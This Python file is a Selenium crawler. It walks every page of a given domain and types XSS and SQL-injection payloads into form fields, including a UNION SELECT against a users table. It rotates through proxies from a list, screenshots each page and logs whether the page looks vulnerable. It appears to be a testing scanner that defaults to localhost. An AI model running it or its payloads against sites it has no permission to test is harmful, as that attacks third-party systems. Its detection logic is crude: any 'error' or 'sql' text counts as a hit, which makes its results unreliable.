import argparse
import logging
import os
import signal
import time
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
import random

# Output directory
OUTPUT_DIR = "Output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Path For Proxy Server List File
PROXY_LIST = os.path.join(OUTPUT_DIR, 'proxy_list.txt')

# Set up logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

interrupted = False
def signal_handler(sig, frame):
    global interrupted
    logging.warning("Interrupt received! Shutting down gracefully...")
    interrupted = True

signal.signal(signal.SIGINT, signal_handler)

# Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<script>console.log('xss')</script>",
]

SQL_PAYLOADS = [
    "1' OR '1'='1",
    "1 UNION SELECT username, password FROM users; --",
    "' OR 'a'='a",
    "' OR 1=1 --",
]

# Load proxy list once at startup
def load_proxy_list():
    """Load proxy servers from the file into a list."""
    try:
        with open(PROXY_LIST, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
        if not proxies:
            logger.warning("Proxy list is empty or file not found.")
            return None
        logger.info(f"Loaded {len(proxies)} proxies from {PROXY_LIST}")
        return proxies
    except FileNotFoundError:
        logger.error(f"Proxy list file {PROXY_LIST} not found.")
        return None

PROXIES = load_proxy_list()
PROXY_INDEX = 0  # Global index to cycle through proxies

def create_driver():
    """Create a Selenium WebDriver instance with a rotating proxy."""
    global PROXY_INDEX
    options = Options()
    options.headless = True
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")

    if PROXIES:
        proxy = PROXIES[PROXY_INDEX % len(PROXIES)]
        PROXY_INDEX += 1
        logger.debug(f"Using proxy: {proxy}")
        options.add_argument(f'--proxy-server={proxy}')
    else:
        logger.warning("No proxies available, proceeding without proxy.")

    try:
        driver = webdriver.Chrome(options=options)
        return driver
    except Exception as e:
        logger.error(f"Failed to create driver with proxy {proxy if PROXIES else 'none'}: {e}")
        return None

def test_XSS_script_injection(driver, url):
    """Test a page for XSS vulnerabilities by targeting all input fields."""
    inputs = driver.find_elements(By.TAG_NAME, "input")
    if not inputs:
        logger.info(f"No input fields found on {url}, skipping XSS test.")
        return {
            "url": url,
            "payload": "N/A",
            "vulnerable": False,
            "status": "No Inputs",
            "response_snippet": "",
            "console_logs": []
        }

    for payload in XSS_PAYLOADS:
        for input_field in inputs:
            input_type = input_field.get_attribute("type")
            if input_type in ["text", "search", "email", "password"]:
                try:
                    input_field.clear()
                    input_field.send_keys(payload)
                    input_field.send_keys(Keys.RETURN)
                except Exception as e:
                    logger.warning(f"Failed to inject payload on {url}: {e}")
                    continue
        
        time.sleep(3)
        response_source = driver.page_source
        console_logs = driver.get_log("browser")
        
        vulnerable = (any(payload in response_source for payload in XSS_PAYLOADS) or
                      any("alert(" in log["message"] for log in console_logs if "message" in log) or
                      any("console.log('xss')" in log["message"] for log in console_logs if "message" in log))
        
        result_status = "Vulnerable" if vulnerable else "Not Vulnerable"
        logger.info(f"Tested {url} with payload {payload}: {result_status}")
        
        driver.save_screenshot(os.path.join(OUTPUT_DIR, f"{urlparse(url).netloc}_xss_{time.time()}.png"))
        
        return {
            "url": url,
            "payload": payload,
            "vulnerable": vulnerable,
            "status": result_status,
            "response_snippet": response_source[:200],
            "console_logs": [log["message"] for log in console_logs if "message" in log][:5]
        }

def test_SQL_script_injection(driver, url):
    """Test a page for SQL injection vulnerabilities by targeting all input fields."""
    inputs = driver.find_elements(By.TAG_NAME, "input")
    if not inputs:
        logger.info(f"No input fields found on {url}, skipping SQL test.")
        return {
            "url": url,
            "payload": "N/A",
            "vulnerable": False,
            "status": "No Inputs",
            "response_snippet": "",
            "console_logs": []
        }

    for payload in SQL_PAYLOADS:
        for input_field in inputs:
            input_type = input_field.get_attribute("type")
            if input_type in ["text", "search", "email", "password"]:
                try:
                    input_field.clear()
                    input_field.send_keys(payload)
                    input_field.send_keys(Keys.RETURN)
                except Exception as e:
                    logger.warning(f"Failed to inject payload on {url}: {e}")
                    continue
        
        time.sleep(3)
        response_source = driver.page_source
        console_logs = driver.get_log("browser")
        
        vulnerable = (any(payload in response_source for payload in SQL_PAYLOADS) or
                      "error" in response_source.lower() or
                      "sql" in response_source.lower() or
                      any("error" in log["message"].lower() for log in console_logs if "message" in log))
        
        result_status = "Vulnerable" if vulnerable else "Not Vulnerable"
        logger.info(f"Tested {url} with payload {payload}: {result_status}")
        
        driver.save_screenshot(os.path.join(OUTPUT_DIR, f"{urlparse(url).netloc}_sql_{time.time()}.png"))
        
        return {
            "url": url,
            "payload": payload,
            "vulnerable": vulnerable,
            "status": result_status,
            "response_snippet": response_source[:200],
            "console_logs": [log["message"] for log in console_logs if "message" in log][:5]
        }

def crawl_website(start_url, max_pages=100):
    """Crawl a website and test for script injection vulnerabilities."""
    domain = urlparse(start_url).netloc
    visited, to_crawl, results = set(), [start_url], []
    
    while ((to_crawl and len(visited) < max_pages) and (not interrupted)):
        url = to_crawl.pop(0)
        if url in visited:
            continue

        visited.add(url)
        logger.info(f"Crawling: {url}")
        
        driver = create_driver()
        if not driver:
            logger.warning(f"Skipping {url} due to driver creation failure.")
            continue
        
        try:
            driver.get(url)
            actual_url = driver.current_url  # Get the URL after redirects
            if actual_url != url:
                logger.info(f"Redirected from {url} to {actual_url}")
            WebDriverWait(driver, 10).until(lambda d: d.find_elements(By.TAG_NAME, "body"))
            
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            inputs = driver.find_elements(By.TAG_NAME, "input")
            logger.info(f"Found {len(inputs)} input fields on {url}")
            
            result_XSS = test_XSS_script_injection(driver, url)
            logger.info(f"XSS Test Result: {result_XSS}")
            results.append(result_XSS)

            result_SQL = test_SQL_script_injection(driver, url)
            logger.info(f"SQL Test Result: {result_SQL}")
            results.append(result_SQL)
            
            for link in soup.find_all('a', href=True):
                abs_url = urljoin(url, link['href'])
                if urlparse(abs_url).netloc == domain and abs_url not in visited:
                    to_crawl.append(abs_url)
        except Exception as e:
            logger.warning(f"Failed to crawl {url}: {e}")
        finally:
            driver.quit()
    
    logger.info(f"Crawl completed. Total results: {len(results)}")
    return results

def save_results(results, domain):
    """Save test results to a file with detailed output."""
    output_file = os.path.join(OUTPUT_DIR, f"{domain}_results.txt")
    with open(output_file, 'w', encoding='utf-8') as f:
        for result in results:
            f.write(f"URL: {result['url']}\n")
            f.write(f"Payload: {result['payload']}\n")
            f.write(f"Vulnerable: {result['vulnerable']}\n")
            f.write(f"Status: {result['status']}\n")
            f.write(f"Response Snippet: {result.get('response_snippet', '')}\n")
            f.write(f"Console Logs: {result.get('console_logs', [])}\n")
            f.write("-" * 50 + "\n")
    logger.info(f"Results saved to {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Crawl a website and test for script injection.")
    parser.add_argument("domain", help="Domain to crawl (e.g., http://localhost:3000)", nargs='?', default="http://localhost:3000")
    parser.add_argument("--max-pages", type=int, default=100, help="Max pages to crawl")
    args = parser.parse_args()
    
    if not args.domain.startswith(('http://', 'https://')):
        args.domain = f"http://{args.domain}"
    
    domain = urlparse(args.domain).netloc
    results = crawl_website(args.domain, args.max_pages)
    save_results(results, domain)